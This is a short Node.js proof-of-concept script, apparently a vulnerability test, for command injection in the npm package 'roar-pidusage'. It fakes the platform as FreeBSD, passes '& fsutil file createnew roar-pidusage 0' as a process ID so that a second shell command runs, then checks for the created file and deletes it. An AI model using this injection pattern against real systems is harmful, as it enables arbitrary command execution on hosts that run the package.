var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const os = require('os');
os.platform = () => {
    return 'freebsd';
};
const roar_pidusage = require('roar-pidusage');
const fs = require('fs');
const path = './roar-pidusage';
roar_pidusage.stat('& fsutil file createnew roar-pidusage 0', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});